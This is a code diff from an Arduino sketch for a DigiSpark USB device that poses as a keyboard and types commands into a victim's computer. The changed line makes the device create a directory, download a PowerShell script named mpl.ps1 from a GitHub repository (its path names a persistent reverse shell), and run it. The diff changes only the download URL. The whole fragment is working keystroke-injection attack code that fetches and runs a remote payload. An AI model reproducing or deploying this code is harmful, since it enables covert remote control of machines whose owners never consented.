@@ -18,7 +18,7 @@ void loop() {
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("mkdir Documents/shl/Common/BTX ; cd Documents/shl/Common/BTX ; powershell -command '& { iwr https://raw.githubusercontent.com/m00-git/DigiSparkProjects/master/PersistentDigiSparkReverseShell/mpl.ps1 -OutFile mpl.ps1 }'; ./mpl.ps1");
+  DigiKeyboard.print("mkdir Documents/shl/Common/BTX ; cd Documents/shl/Common/BTX ; powershell -command '& { iwr https://github.com/cagatayceyhan/DigiSparkProjects/tree/master/reversedeneme/mpl.ps1 -OutFile mpl.ps1 }'; ./mpl.ps1");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
